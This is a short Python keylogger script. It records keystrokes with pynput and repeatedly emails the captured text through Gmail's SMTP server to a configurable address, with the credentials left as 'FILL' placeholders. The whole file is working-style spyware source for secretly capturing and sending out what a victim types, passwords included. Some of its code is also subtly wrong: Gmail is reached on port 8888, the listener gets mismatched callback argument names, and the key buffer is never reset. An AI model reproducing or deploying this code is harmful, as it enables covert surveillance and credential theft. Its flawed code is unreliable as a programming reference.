import smtplib
import ssl
from pynput.keyboard import Key, Listener

count = 0
keys = []


def send_to_email(message_text):
    smtp_server = "smtp.gmail.com"  # smtp for Gmail, so we can send the email
    port = 8888
    sender_email = "FILL"  # change "FILL" to sender email
    # change "FILL" to the password of the gmail account so it can send the keystroke
    password = "FILL"
    # change "FILL" to receiver email so it can receive the keystroke (can be the same as sender_email)
    receiver_email = "FILL"
    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message_text)

    except Exception as e:
        print(e)
    finally:
        server.quit()


def key_pressed(key):
    print(key, end=" " + "pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 8:
        count = 0
        email(keys)


def email(keys):
    message_text = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key.find("Key") > 0:
            k = ""
        message_text += k
    print(message_text)
    send_to_email(message_text)


def release(key):
    if key == Key.esc:
        return False


with Listener(key_pressed=key_pressed, release=release) as listener:
    listener.join()
